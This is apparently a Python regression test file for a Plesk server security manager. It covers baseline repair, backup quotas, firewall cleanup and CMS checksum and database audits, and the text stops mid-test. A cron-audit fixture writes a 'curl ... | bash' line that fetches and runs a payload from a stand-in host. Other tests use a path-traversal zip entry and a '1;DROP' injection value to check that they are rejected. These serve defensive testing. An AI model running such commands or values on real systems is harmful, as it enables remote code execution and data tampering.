"""Isolated management regression tests. No live Plesk/services or cloud calls."""
import hashlib
import io
import importlib.machinery
import importlib.util
import json
import os
import pathlib
import shlex
import tempfile
import time
import unittest
import zipfile
from unittest import mock

ROOT = pathlib.Path(__file__).resolve().parents[1]
loader = importlib.machinery.SourceFileLoader('guardian_management_tests', str(ROOT / 'sbin/guardian-manager'))
spec = importlib.util.spec_from_loader(loader.name, loader)
m = importlib.util.module_from_spec(spec)
loader.exec_module(m)


@unittest.skipUnless(os.geteuid() == 0, 'isolated Linux root runner required')
class ManagementTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = pathlib.Path(self.tmp.name)
        self.vhosts = self.base / 'vhosts'
        self.home = self.vhosts / 'example.com'
        self.web = self.home / 'httpdocs'
        self.web.mkdir(parents=True)
        os.chown(self.web, 65534, 65534)
        for attr, value in [('ROOT', self.base / 'guardian'), ('VHOSTS', self.vhosts),
                            ('INCIDENT_LOG', self.base / 'guardian/incidents.jsonl')]:
            patcher = mock.patch.object(m.h, attr, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        patcher = mock.patch.object(m.h, 'plesk_hosting_path', return_value=(str(self.web), str(self.home)))
        patcher.start()
        self.addCleanup(patcher.stop)
        m.prepare()

    def write_site(self, relative, data):
        path = self.web / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        os.chown(path, 65534, 65534)
        return path

    def clean_report(self):
        report = {'id': 'a' * 32, 'domain': 'example.com', 'status': 'finished', 'infected': 0,
                  'epoch': time.time(), 'started_at': m.h.utc_now(), 'findings': []}
        m.h.save_job(report)
        return report

    def malware_report(self, data=b'BAD'):
        self.write_site('index.php', data)
        metadata, fd, _ = m.h.file_metadata(self.web, 'index.php')
        os.close(fd)
        report = {'id': 'b' * 32, 'domain': 'example.com', 'status': 'finished', 'infected': 1,
                  'epoch': time.time(), 'started_at': m.h.utc_now(),
                  'findings': [{'path': 'index.php', 'state': 'found', 'fingerprint': metadata}]}
        m.h.save_job(report)
        return report

    def test_baseline_requires_clean_scan_and_explicit_trust(self):
        self.write_site('index.php', b'GOOD')
        with self.assertRaises(ValueError):
            m.baseline('example.com', True)
        self.clean_report()
        with self.assertRaises(ValueError):
            m.baseline('example.com', False)
        m.baseline('example.com', True)
        self.assertEqual(m.config()['baselines']['example.com']['files'], 1)
        self.assertNotIn('example.com', m.config()['autorepair'])

    def test_baseline_inventory_quota_and_manual_deletion_guard(self):
        self.write_site('index.php', b'GOOD')
        self.clean_report()
        m.baseline('example.com', True)
        baseline = m.config()['baselines']['example.com']
        token = baseline['id']
        inventory = m.baseline_inventory()
        self.assertEqual(len(inventory), 1)
        self.assertEqual(inventory[0]['id'], token)
        self.assertTrue(inventory[0]['active'])
        self.assertGreater(inventory[0]['bytes'], 0)
        self.assertEqual(m.storage_status()['areas']['baselines']['bytes'], inventory[0]['bytes'])
        m.repair_set('example.com', 'on')
        with self.assertRaisesRegex(ValueError, 'automatische Reparatur'):
            m.baseline_delete(token, 'example.com')
        m.repair_set('example.com', 'off')
        with self.assertRaisesRegex(ValueError, 'anderen Domain'):
            m.baseline_delete(token, 'wrong.example.com')
        result = m.baseline_delete(token, 'example.com')
        self.assertEqual(result['id'], token)
        self.assertFalse((m.root() / 'baselines' / token).exists())
        self.assertNotIn('example.com', m.config()['baselines'])
        self.assertEqual(m.storage_status()['areas']['baselines']['bytes'], 0)

    def test_backup_quota_visibility_and_active_waf_backup_protection(self):
        source = self.base / 'waf-backup.conf'
        source.write_bytes(b'# Guardian managed\nSecRuleEngine On\n')
        backup = m.make_backup('waf', 'example.com', source)
        status = m.storage_status()
        backup_files = [m.root() / 'backups' / (backup['id'] + suffix) for suffix in ('.bin', '.json')]
        self.assertEqual(status['areas']['backups']['bytes'], sum(path.stat().st_size for path in backup_files))
        self.assertEqual(status['backup_quota_bytes'], m.BACKUP_QUOTA_BYTES)
        settings = m.config()
        settings['waf'] = {'backup': backup['id']}
        m.save_config(settings)
        with self.assertRaisesRegex(ValueError, 'aktuelle Guardian-WAF'):
            m.backup_delete(backup['id'])
        settings.pop('waf')
        m.save_config(settings)
        m.backup_delete(backup['id'])
        self.assertFalse((m.root() / 'backups' / (backup['id'] + '.bin')).exists())
        self.assertFalse((m.root() / 'backups' / (backup['id'] + '.json')).exists())
        self.assertEqual(m.storage_status()['areas']['backups']['bytes'], 0)

    def test_backup_quota_rejects_before_writing(self):
        with mock.patch.object(m, 'directory_usage', return_value={'bytes': m.BACKUP_QUOTA_BYTES, 'files': 1, 'incomplete': False}):
            with self.assertRaisesRegex(ValueError, '256 MiB'):
                m.check_backup_capacity(1)

    def test_baseline_global_quota_removes_partial_capture(self):
        self.write_site('index.php', b'GOOD')
        self.clean_report()
        with mock.patch.object(m, 'directory_usage', return_value={
                'bytes': m.BASELINE_QUOTA_BYTES, 'files': 1, 'incomplete': False}):
            with self.assertRaisesRegex(ValueError, '512 MiB'):
                m.baseline('example.com', True)
        self.assertEqual(list((m.root() / 'baselines').iterdir()), [])

    def test_cron_audit_reports_suspicious_patterns_without_changing_sources(self):
        cron_root = self.base / 'cron'
        cron_root.mkdir()
        source = cron_root / 'daily-task'
        content = b'#!/bin/sh\n0 * * * * root curl https://bad.example/payload | bash\n'
        source.write_bytes(content)
        outside = cron_root / 'outside'
        outside.write_text('*/5 * * * * root echo safe\n')
        link = cron_root / 'linked-cron'
        link.symlink_to(outside)
        with mock.patch.object(m, 'CRON_FILES', (source,)), \
                mock.patch.object(m, 'CRON_DIRS', (cron_root,)):
            result = m.cron_audit()
        self.assertEqual(result['finding_count'], 1)
        self.assertEqual(result['findings'][0]['rule'], 'remote-shell-pipe')
        self.assertNotIn('bad.example', json.dumps(result))
        self.assertEqual(source.read_bytes(), content)
        self.assertTrue(link.is_symlink())

    def test_uninstall_removes_only_guardian_firewall_rules_through_confirmed_rollback(self):
        managed = {'available': True, 'limited': False, 'pending': {}, 'rules': [
            {'id': '41', 'network': '203.0.113.25/32'},
            {'id': '42', 'network': '2001:db8::1/128'},
            {'id': '43', 'network': '203.0.113.25/32'},
        ]}
        calls = []
        def fake_firewall_action(operation, target='', remote_address=''):
            calls.append((operation, target))
            return {'state': 'awaiting_confirmation' if operation == 'unban' else 'confirmed'}
        with mock.patch.object(m.h, 'firewall_rules', return_value=managed), \
             mock.patch.object(m.h, 'firewall_status', return_value={'plesk_firewall_active': True}), \
             mock.patch.object(m.h, 'firewall_action', side_effect=fake_firewall_action), \
             mock.patch.object(m, 'public_status', return_value={'handlers': []}), \
             mock.patch.object(m.h, 'monitor_config', return_value={}), \
             mock.patch.object(m, 'waf_file', side_effect=ValueError('not configured')):
            result = m.uninstall_cleanup()
        self.assertIn('Firewallregeln entfernt', result['message'])
        self.assertEqual(calls, [('unban', '2001:db8::1/128'), ('confirm', ''),
                                 ('unban', '203.0.113.25/32'), ('confirm', '')])

    def test_uninstall_refuses_when_installed_plesk_firewall_cannot_be_listed(self):
        firewall_settings = self.base / 'firewall-settings'
        firewall_settings.touch()
        with mock.patch.object(m.h, 'FIREWALL_SETTINGS', firewall_settings), \
             mock.patch.object(m.h, 'firewall_rules', return_value={
                 'available': False, 'rules': [], 'pending': {}}):
            with self.assertRaisesRegex(ValueError, 'Deinstallation abgebrochen'):
                m.uninstall_cleanup()

    def fake_wp_cli(self, message, exit_code, kind='core'):
        temporary = tempfile.TemporaryDirectory(prefix='guardian-wp-cli-test-', dir='/var/lib')
        self.addCleanup(temporary.cleanup)
        folder = pathlib.Path(temporary.name)
        os.chmod(folder, 0o755)
        path = folder / 'wp'
        required = 'core verify-checksums' if kind == 'core' else 'plugin verify-checksums --all'
        script = ('#!/bin/sh\ncase "$*" in *--insecure*) exit 41;; esac\n'
                  '[ "$(id -u)" = "65534" ] || exit 42\n'
                  'for arg in --skip-plugins --skip-themes --skip-packages; do case " $* " in *" $arg "*) ;; *) exit 43;; esac; done\n'
                  'case "$*" in *' + shlex.quote(required) + '*) ;; *) exit 44;; esac\n'
                  'printf "%s\\n" ' + shlex.quote(message) + '\nexit ' + str(exit_code) + '\n')
        path.write_text(script)
        os.chmod(path, 0o755)
        with mock.patch.object(m, 'WP_CLI_PATHS', (str(path),)):
            return m.wordpress_checksum_audit('example.com', kind)

    def test_wordpress_core_checksum_audit_uses_unprivileged_cli_without_mutation(self):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        result = self.fake_wp_cli('Success: WordPress installation verifies against checksums.', 0)
        self.assertEqual(result['status'], 'verified')
        self.assertEqual(result['finding_count'], 0)
        self.assertEqual((self.web / 'wp-load.php').read_bytes(), b'<?php // fixture')

    def test_wordpress_core_checksum_mismatch_is_reported_without_file_content(self):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        result = self.fake_wp_cli("Warning: File doesn't verify against checksum: wp-admin/admin.php", 1)
        self.assertEqual(result['status'], 'mismatch')
        self.assertEqual(result['findings'], [{'path': 'wp-admin/admin.php',
                                                'rule': 'wordpress-core-checksum-mismatch'}])
        self.assertNotIn('fixture', json.dumps(result))
        events = m.h.incident_list()
        self.assertTrue(any(item['type'] == 'cms_checksum_mismatch' for item in events))

    def test_wordpress_core_checksum_audit_rejects_symlinked_core_paths(self):
        self.write_site('wp-load.php', b'<?php // fixture')
        actual = self.web / 'actual-core'
        actual.mkdir()
        (actual / 'version.php').write_text('<?php $wp_version = "6.8.1";')
        os.chown(actual, 65534, 65534)
        os.chown(actual / 'version.php', 65534, 65534)
        (self.web / 'wp-includes').symlink_to(actual, target_is_directory=True)
        with self.assertRaisesRegex(ValueError, 'Symlinks'):
            m.wordpress_core_checksum_audit('example.com')

    def test_wordpress_plugin_checksum_audit_marks_missing_vendor_checksums_partial(self):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        output = ('Warning: Could not retrieve the checksums for version 2.3.4 of plugin premium-addon, skipping.\n'
                  'Success: Verified 4 of 5 plugins (1 skipped).')
        result = self.fake_wp_cli(output, 0, 'plugins')
        self.assertEqual(result['status'], 'partial')
        self.assertEqual(result['unverified_plugins'], ['premium-addon'])
        self.assertEqual(result['finding_count'], 0)

    def test_wordpress_plugin_checksum_mismatch_is_reported_separately(self):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        output = "Warning: File doesn't verify against checksum: wp-content/plugins/example/plugin.php"
        result = self.fake_wp_cli(output, 1, 'plugins')
        self.assertEqual(result['status'], 'mismatch')
        self.assertEqual(result['findings'][0]['rule'], 'wordpress-plugin-checksum-mismatch')

    def write_wp_theme(self, slug='sample-theme', version='1.2', content=b'<?php echo "theme";'):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        theme = self.web / 'wp-content' / 'themes' / slug
        theme.mkdir(parents=True)
        os.chown(theme.parent.parent, 65534, 65534)
        os.chown(theme.parent, 65534, 65534)
        os.chown(theme, 65534, 65534)
        (theme / 'style.css').write_text('/*\nTheme Name: Sample\nVersion: %s\n*/\n' % version)
        os.chown(theme / 'style.css', 65534, 65534)
        (theme / 'index.php').write_bytes(content)
        os.chown(theme / 'index.php', 65534, 65534)
        return theme

    def wp_theme_archive(self, slug='sample-theme', version='1.2', content=b'<?php echo "theme";'):
        output = io.BytesIO()
        with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(slug + '/style.css', '/*\nTheme Name: Sample\nVersion: %s\n*/\n' % version)
            archive.writestr(slug + '/index.php', content)
        return output.getvalue()

    def run_wp_theme_audit(self, archive):
        with mock.patch.object(m.h, 'binary', side_effect=AssertionError('Theme check must not require WP-CLI')), \
                mock.patch.object(m, 'wordpress_theme_archive', return_value=archive):
            return m.wordpress_theme_checksum_audit('example.com')

    def test_wordpress_org_theme_checksum_matches_exact_version_archive(self):
        self.write_wp_theme()
        report = self.run_wp_theme_audit(self.wp_theme_archive())
        self.assertEqual(report['status'], 'verified')
        self.assertEqual(report['finding_count'], 0)
        stored = m.public_status()['wordpress_theme_checksum']['example.com']
        self.assertEqual(stored['themes'][0]['status'], 'verified')

    def test_wordpress_org_theme_checksum_reports_changed_file_without_content(self):
        self.write_wp_theme(content=b'<?php echo "local";')
        report = self.run_wp_theme_audit(self.wp_theme_archive())
        self.assertEqual(report['status'], 'mismatch')
        self.assertEqual(report['finding_count'], 1)
        self.assertEqual(report['themes'][0]['findings'], [{'path': 'index.php', 'rule': 'wordpress-theme-file-mismatch'}])
        self.assertNotIn('local', json.dumps(report))
        self.assertTrue(any(item['type'] == 'cms_checksum_mismatch' for item in m.h.incident_list()))

    def test_wordpress_org_theme_checksum_rejects_archive_path_traversal(self):
        self.write_wp_theme()
        output = io.BytesIO()
        with zipfile.ZipFile(output, 'w') as archive:
            archive.writestr('../escape.php', b'bad')
        report = self.run_wp_theme_audit(output.getvalue())
        self.assertEqual(report['status'], 'partial')
        self.assertIn('unerwarteten Dateipfad', report['themes'][0]['note'])

    def test_wordpress_theme_fetch_rejects_non_wordpress_hosts_before_network(self):
        with mock.patch.object(m.urllib.request, 'urlopen') as open_url:
            with self.assertRaisesRegex(ValueError, 'nur HTTPS von WordPress.org'):
                m.wordpress_theme_fetch('https://example.net/theme.zip', 1024)
        open_url.assert_not_called()

    def test_wordpress_theme_archive_requests_the_installed_version(self):
        class FakeResponse:
            def __init__(self, body, url):
                self.body = body
                self.url = url
            def __enter__(self):
                return self
            def __exit__(self, *args):
                return False
            def geturl(self):
                return self.url
            def read(self, size):
                return self.body[:size]

        api_data = json.dumps({'slug': 'sample-theme', 'version': '2.0',
                               'versions': {'1.2': 'https://downloads.wordpress.org/theme/sample-theme.1.2.zip',
                                            '2.0': 'https://downloads.wordpress.org/theme/sample-theme.2.0.zip'}}).encode()
        archive_data = self.wp_theme_archive()
        opener = mock.Mock()
        opener.open.side_effect = [FakeResponse(api_data, 'https://api.wordpress.org/themes/info/1.2/'),
                                   FakeResponse(archive_data, 'https://downloads.wordpress.org/theme/sample-theme.1.2.zip')]
        with mock.patch.object(m.urllib.request, 'build_opener', return_value=opener):
            result = m.wordpress_theme_archive('sample-theme', '1.2')
        self.assertEqual(result, archive_data)
        self.assertEqual(opener.open.call_count, 2)
        self.assertIn('request%5Bslug%5D=sample-theme', opener.open.call_args_list[0].args[0].full_url)
        self.assertTrue(opener.open.call_args_list[1].args[0].full_url.endswith('sample-theme.1.2.zip'))

    def test_wordpress_org_theme_checksum_marks_unavailable_vendor_version_partial(self):
        self.write_wp_theme(version='custom-3')
        with mock.patch.object(m.h, 'binary', side_effect=AssertionError('Theme check must not require WP-CLI')), \
                mock.patch.object(m, 'wordpress_theme_archive', side_effect=ValueError('keine Vendor-Version')):
            report = m.wordpress_theme_checksum_audit('example.com')
        self.assertEqual(report['status'], 'partial')
        self.assertEqual(report['themes'][0]['status'], 'incomplete')

    def fake_wp_db_cli(self, candidate='42\tpost_content\tobfuscated-execution\n', fail_query=False):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        temporary = tempfile.TemporaryDirectory(prefix='guardian-wp-db-cli-test-', dir='/var/lib')
        self.addCleanup(temporary.cleanup)
        folder = pathlib.Path(temporary.name)
        os.chmod(folder, 0o755)
        path = folder / 'wp'
        path.write_text('#!/bin/sh\nexit 0\n')
        os.chmod(path, 0o755)
        calls = []

        def fake_run(args, **kwargs):
            calls.append((args, kwargs.get('input')))
            if args[-2:] == ['db', 'prefix']:
                output, rc = b'wp_\n', 0
            elif args[-4:] == ['db', 'tables', '--scope=blog', '--format=list']:
                output, rc = b'wp_posts\nwp_postmeta\nwp_options\n', 0
            elif 'query' in args:
                output = candidate.encode() if b'FROM `wp_posts`' in kwargs['input'] else b''
                # The fake database never sees data from wp-config; it only receives fixed SELECT statements.
                self.assertIn(b'SELECT ', kwargs['input'])
                self.assertIn(b'LIMIT 101', kwargs['input'])
                self.assertNotIn(b'UPDATE ', kwargs['input'])
                rc = 1 if fail_query else 0
            else:
                self.fail('Unexpected WP-CLI invocation: %r' % args)
            kwargs['stdout'].write(output)
            return type('Result', (), {'returncode': rc})()

        with mock.patch.object(m.h, 'binary', return_value=str(path)), \
                mock.patch.object(m.subprocess, 'run', side_effect=fake_run):
            result = m.wordpress_database_audit('example.com')
        self.assertGreaterEqual(len(calls), 3)
        return result

    def test_wordpress_database_audit_reports_only_safe_identifiers_read_only(self):
        result = self.fake_wp_db_cli('42\tpost_content\tobfuscated-execution\n')
        self.assertEqual(result['status'], 'candidates')  # Optional comment tables are absent.
        self.assertEqual(result['findings'], [{'table': 'posts', 'row_id': '42',
                                                'column': 'post_content', 'rule': 'obfuscated-execution'}])
        self.assertNotIn('payload', json.dumps(result))
        self.assertTrue(any(item['type'] == 'cms_database_indicators' for item in m.h.incident_list()))

    def test_wordpress_database_audit_rejects_non_numeric_database_identifiers(self):
        result = self.fake_wp_db_cli('1;DROP\tpost_content\tobfuscated-execution\n')
        self.assertEqual(result['status'], 'partial')
        self.assertEqual(result['findings'], [])

    def test_wordpress_database_audit_marks_database_query_failure_partial(self):
        result = self.fake_wp_db_cli(candidate='', fail_query=True)
        self.assertEqual(result['status'], 'partial')
        self.assertEqual(result['findings'], [])

    def fake_wp_database_stream(self, dump=b'CREATE TABLE wp_posts (id INT);', clam_hit=False, export_rc=0):
        self.write_site('wp-load.php', b'<?php // fixture')
        self.write_site('wp-includes/version.php', b'<?php $wp_version = "6.8.1";')
        temporary = tempfile.TemporaryDirectory(prefix='guardian-wp-db-clam-test-', dir='/var/lib')
        self.addCleanup(temporary.cleanup)
        folder = pathlib.Path(temporary.name)
        os.chmod(folder, 0o755)
        wp = folder / 'wp'
        wp.write_text('#!/bin/sh\ncase " $* " in *" db export - "*) ;; *) exit 41;; esac\n'
                      '[ "$(id -u)" = "65534" ] || exit 42\n'
                      'printf %s ' + shlex.quote(dump.decode('ascii')) + '\nexit ' + str(export_rc) + '\n')
        os.chmod(wp, 0o755)
        clam = folder / 'clamscan'
        clam.write_text('#!/bin/sh\n[ "$(id -u)" = "65534" ] || exit 42\n'
                        'payload=$(cat)\n' +
                        ('case "$payload" in *MALWARE*) printf "stdin: Test.Database.Malware FOUND\\n"; exit 1;; esac\n'
                         if clam_hit else '') + 'exit 0\n')
        os.chmod(clam, 0o755)

        def which(paths):
            return str(wp if paths == m.WP_CLI_PATHS else clam)

        with mock.patch.object(m.h, 'binary', side_effect=which):
            return m.wordpress_database_clamav_audit('example.com')

    def test_wordpress_database_clamav_stream_clean_export_without_dump_file(self):
        payload = b'CREATE TABLE wp_posts (id INT);'
        result = self.fake_wp_database_stream(payload)
        self.assertEqual(result['status'], 'no_signatures')
        self.assertEqual(result['bytes_scanned'], len(payload))
        self.assertEqual(result['findings'], [])
        self.assertNotIn('CREATE TABLE', json.dumps(result))

    def test_wordpress_database_clamav_stream_reports_signature_only(self):
        result = self.fake_wp_database_stream(b'INJECTED_MALWARE_ROW', clam_hit=True)
        self.assertEqual(result['status'], 'found')
        self.assertEqual(result['findings'], [{'signature': 'Test.Database.Malware',
                                               'rule': 'clamav-database-signature'}])
        self.assertNotIn('INJECTED', json.dumps(result))
        self.assertTrue(any(item['type'] == 'cms_database_indicators' for item in m.h.incident_list()))

    def test_wordpress_database_clamav_stream_limit_is_partial_not_clean(self):
        with mock.patch.object(m, 'WP_DB_SIGNATURE_MAX_BYTES', 4):
            result = self.fake_wp_database_stream(b'larger-than-limit')
        self.assertEqual(result['status'], 'partial')
        self.assertTrue(result['truncated'])
        self.assertLessEqual(result['bytes_scanned'], 4)

    def test_wordpress_database_clamav_export_failure_is_not_clean(self):
        result = self.fake_wp_database_stream(b'', export_rc=5)
        self.assertEqual(result['status'], 'partial')
        self.assertIn('Datenbankexport', result['error'])

    def test_joomla_database_config_reads_only_static_literal_properties(self):
        config = self.write_site(
            'configuration.php',
            b'<?php class JConfig { public $dbtype = "mysqli"; public $host = "127.0.0.1"; '
            b'public $user = "joomla_user"; public $password = "p\\"ass"; '
            b'public $db = "joomla_db"; public $dbprefix = "jml_"; }')
        parsed = m.static_joomla_database_config(config, self.web)
        self.assertEqual(parsed['host'], '127.0.0.1')
        self.assertEqual(parsed['user'], 'joomla_user')
        self.assertEqual(parsed['password'], 'p"ass')
        self.assertEqual(parsed['db'], 'joomla_db')
        self.assertEqual(parsed['prefix'], 'jml_')

    def test_joomla_database_config_rejects_dynamic_credentials(self):
        config = self.write_site(
            'configuration.php',
            b'<?php class JConfig { public $host = "localhost"; public $user = "u"; '
            b'// public $password = "stale-commented-value";\n'
            b'public $password = getenv("DB_PASSWORD"); public $db = "joomla_db"; }')
        with self.assertRaisesRegex(ValueError, 'statischen Literalen'):
            m.static_joomla_database_config(config, self.web)

    def test_magento_database_config_parses_literal_return_array_without_execution(self):
        config = self.write_site(
            'app/etc/env.php',
            b"<?php return ['db' => ['table_prefix' => 'mg_', 'connection' => ['default' => "
            b"['host' => 'localhost', 'dbname' => 'shop', 'username' => 'shop_user', "
            b"'password' => 'secret', 'port' => 3307]]]];")
        parsed = m.magento_database_config(config, self.web)
        self.assertEqual(parsed, {'host': 'localhost', 'user': 'shop_user', 'password': 'secret',
                                  'db': 'shop', 'prefix': 'mg_', 'port': 3307})

    def test_magento_database_config_rejects_php_expressions(self):
        config = self.write_site(
            'app/etc/env.php',
            b"<?php return ['db' => ['connection' => ['default' => "
            b"['host' => 'localhost', 'dbname' => 'shop', 'username' => 'u', "
            b"'password' => getenv('DB_PASSWORD')]]]];")
        with self.assertRaisesRegex(ValueError, 'Dynamischer PHP-Konfigurationswert'):
            m.magento_database_config(config, self.web)

    def test_joomla_clamav_export_uses_private_option_file_and_stream(self):
        self.write_site(
            'configuration.php',
            b'<?php class JConfig { public $dbtype = "mysqli"; public $host = "localhost"; '
            b'public $user = "joomla_user"; public $password = "test-secret"; '
            b'public $db = "joomla_db"; }')
        temporary = tempfile.TemporaryDirectory(prefix='guardian-cms-db-test-', dir='/var/lib')
        self.addCleanup(temporary.cleanup)
        folder = pathlib.Path(temporary.name)
        os.chmod(folder, 0o755)
        dump = folder / 'mysqldump'
        observed = folder / 'observed-option-path'
        observed.touch()
        os.chmod(observed, 0o666)
        dump.write_text(
            '#!/bin/sh\n'
            '[ "$(id -u)" = "65534" ] || exit 42\n'
            'case "$1" in --defaults-extra-file=*) option=$(echo "$1" | cut -d= -f2-);; *) exit 43;; esac\n'
            'printf %s "$option" > ' + shlex.quote(str(observed)) + '\n'
            '[ "$(stat -c %a "$option")" = "600" ] || exit 44\n'
            'grep -Fq test-secret "$option" || exit 45\n'
            'case " $* " in *test-secret*) exit 46;; esac\n'
            'printf "CREATE TABLE jml_content (id INT);"\n')
        os.chmod(dump, 0o755)
        clam = folder / 'clamscan'
        clam.write_text('#!/bin/sh\n[ "$(id -u)" = "65534" ] || exit 42\ncat >/dev/null\nexit 0\n')
        os.chmod(clam, 0o755)

        def which(paths):
            if paths == ('/usr/bin/mysqldump', '/usr/bin/mariadb-dump', '/bin/mysqldump'):
                return str(dump)
            if paths == m.h.CLAM_PATHS:
                return str(clam)
            return None

        with mock.patch.object(m.h, 'binary', side_effect=which):
            result = m.cms_database_clamav_audit('example.com', 'joomla')
        self.assertEqual(result['cms'], 'joomla')
        self.assertEqual(result['status'], 'no_signatures')
        self.assertNotIn('test-secret', json.dumps(result))
        self.assertTrue(observed.exists())
        self.assertFalse(pathlib.Path(observed.read_text()).exists())

    def test_repair_preserves_original_and_rollback_refuses_user_changes(self):
        self.write_site('index.php', b'GOOD')
        os.chmod(self.web / 'index.php', 0o600)
        self.clean_report()
        m.baseline('example.com', True)
        report = self.malware_report()
        m.repair_one(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'GOOD')
        self.assertEqual((self.web / 'index.php').stat().st_mode & 0o777, 0o600)
        finding = m.h.load_job(report['id'])['findings'][0]
        self.assertEqual((m.h.ROOT / 'quarantine' / finding['quarantine_id']).read_bytes(), b'BAD')
        self.write_site('index.php', b'USER_UPDATE')
        with self.assertRaises(ValueError):
            m.repair_rollback(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'USER_UPDATE')
        self.write_site('index.php', b'GOOD')
        m.repair_rollback(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'BAD')
        self.assertEqual((m.h.ROOT / 'quarantine' / finding['quarantine_id']).read_bytes(), b'GOOD')

    def test_modified_finding_is_never_replaced(self):
        self.write_site('index.php', b'GOOD')
        self.clean_report()
        m.baseline('example.com', True)
        report = self.malware_report()
        self.write_site('index.php', b'USER_UPDATE')
        with self.assertRaises(ValueError):
            m.repair_one(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'USER_UPDATE')

    def test_baseline_tampering_and_unknown_files_are_rejected(self):
        self.write_site('index.php', b'GOOD')
        self.clean_report()
        m.baseline('example.com', True)
        item = m.config()['baselines']['example.com']
        blob = m.root() / 'baselines' / item['id'] / m.digest(b'GOOD')
        blob.write_bytes(b'TAMPERED')
        report = self.malware_report()
        with self.assertRaises(ValueError):
            m.repair_one(report['id'], 0)
        self.assertEqual((self.web / 'index.php').read_bytes(), b'BAD')

    def test_autorepair_off_by_default_and_enabled_only_for_selected_baseline(self):
        self.write_site('index.php', b'GOOD')
        self.clean_report()
        m.baseline('example.com', True)
        report = self.malware_report()
        m.auto_repair(report['id'])
        self.assertEqual((self.web / 'index.php').read_bytes(), b'BAD')
        m.repair_set('example.com', 'on')
        m.auto_repair(report['id'])
        self.assertEqual((self.web / 'index.php').read_bytes(), b'GOOD')

    def test_reputation_consent_private_ips_schema_and_cache(self):
        for ip in ('127.0.0.1', '10.0.0.1', '::1', 'invalid'):
            with self.assertRaises(ValueError):
                m.reputation(ip)
        with self.assertRaises(ValueError):
            m.reputation('8.8.8.8')
        m.cloud_save({'abuseipdb_key': 'a' * 80, 'consent': True})
        with mock.patch.object(m, 'api_json', return_value={'data': {'ipAddress': '8.8.8.8',
                               'abuseConfidenceScore': 42, 'totalReports': 3}}) as fetch:
            self.assertEqual(m.reputation('8.8.8.8')['score'], 42)
            self.assertEqual(m.reputation('8.8.8.8')['score'], 42)
            fetch.assert_called_once()
        with mock.patch.object(m, 'api_json', return_value={'data': {'ipAddress': '1.1.1.2', 'abuseConfidenceScore': 5}}):
            with self.assertRaises(ValueError):
                m.reputation('1.1.1.1')

    def test_ignore_hash_is_domain_scoped_visible_and_reversible(self):
        sha = m.digest(b'known false positive')
        report = self.malware_report(b'known false positive')
        m.ignore_hash_set('example.com', sha, 'add')
        self.assertEqual(m.config()['ignore_hashes']['example.com'], [sha])
        finding = {'path': 'cache.php', 'state': 'found', 'fingerprint': {'sha256': sha}}
        self.assertEqual(m.h.annotate_ignored_findings('example.com', [finding]), 1)
        self.assertTrue(finding['ignored'])
        other = {'fingerprint': {'sha256': sha}}
        self.assertEqual(m.h.annotate_ignored_findings('other.example', [other]), 0)
        self.assertFalse(other['ignored'])
        self.assertIn(sha, m.public_status()['ignore_hashes']['example.com'])
        with self.assertRaises(ValueError):
            m.ignore_hash_set('example.com', 'invalid', 'add')
        with self.assertRaises(ValueError):
            m.repair_one(report['id'], 0)
        m.ignore_hash_set('example.com', sha, 'remove')
        restored = {'fingerprint': {'sha256': sha}}
        self.assertEqual(m.h.annotate_ignored_findings('example.com', [restored]), 0)
        self.assertFalse(restored['ignored'])
    def test_status_never_contains_provider_secrets(self):
        m.cloud_save({'abuseipdb_key': 'ABUSE_SECRET_12345', 'turnstile_sitekey': 'SITE_KEY_12345',
                      'turnstile_secret': 'TURNSTILE_SECRET_12345', 'consent': True})
        with mock.patch.object(m, 'PHP_BASE', self.base / 'missing'):
            output = json.dumps(m.public_status())
        for key in ('ABUSE_SECRET_12345', 'TURNSTILE_SECRET_12345'):
            self.assertNotIn(key, output)
        self.assertEqual(os.stat(m.root() / 'config.json').st_mode & 0o777, 0o600)

    def test_bot_install_preserves_ini_and_refuses_external_prepend(self):
        self.write_site('.user.ini', b'memory_limit=128M\n')
        m.cloud_save({'turnstile_sitekey': 'SITE_KEY_12345', 'turnstile_secret': 'TURNSTILE_SECRET_12345', 'consent': True})
        with mock.patch.object(m, 'run', return_value='OK'):
            m.bots_set('example.com', 'on')
            data = (self.web / '.user.ini').read_bytes()
            self.assertIn(b'auto_prepend_file', data)
            self.assertIn(b'memory_limit=128M', data)
            with self.assertRaises(ValueError):
                m.cloud_save({'clear': True, 'consent': False})
            m.bots_set('example.com', 'off')
        self.assertEqual((self.web / '.user.ini').read_bytes(), b'memory_limit=128M\n')
        guard = pathlib.Path(m.config()['bots']['example.com']['guard']).read_text()
        self.assertNotIn('TURNSTILE_SECRET_12345', guard)
        self.assertIn('Guardian disabled', guard)
        self.write_site('.user.ini', b'auto_prepend_file=/external.php\n')
        with self.assertRaises(ValueError):
            m.bots_set('example.com', 'on')

    def test_bot_disable_refuses_changed_ini(self):
        m.cloud_save({'turnstile_sitekey': 'SITE_KEY_12345', 'turnstile_secret': 'TURNSTILE_SECRET_12345', 'consent': True})
        with mock.patch.object(m, 'run', return_value='OK'):
            m.bots_set('example.com', 'on')
        self.write_site('.user.ini', b'USER CONFIG')
        with self.assertRaises(ValueError):
            m.bots_set('example.com', 'off')
        self.assertEqual((self.web / '.user.ini').read_bytes(), b'USER CONFIG')

    def test_waf_rules_fixed_ids_limits_and_modes(self):
        rules = m.waf_rules('example.com', 'enforce', 120)
